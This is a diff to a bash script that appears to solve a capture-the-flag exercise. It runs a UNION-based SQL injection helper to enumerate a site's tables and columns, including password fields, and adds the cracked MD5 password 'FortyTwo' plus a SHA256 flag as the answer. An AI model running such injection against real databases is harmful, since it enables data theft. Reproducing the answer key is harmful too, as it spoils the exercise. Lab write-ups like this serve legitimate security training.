@@ -1,11 +1,11 @@
 #!/bin/bash
 
-# python union_enumerator.py "table_name from information_schema.tables"
-# # db_default
-# # users
-# # guestbook
-# # list_images
-# # vote_dbs
+python union_enumerator.py "table_name from information_schema.tables"
+# db_default
+# users
+# guestbook
+# list_images
+# vote_dbs
 # python union_enumerator.py "column_name from information_schema.columns"
 # # ...
 # # password
@@ -38,4 +38,7 @@ done;
 # Ich spreche kein Deutsch.
 # ????? ????????????? ?????????
 # Decrypt this password -&gt; then lower all the char. Sh256 on it and it's good !
-
+# ANSWER: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
+# SHA256 9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646
+echo "# ANSWER: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo"
+echo "# SHA256 9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646"
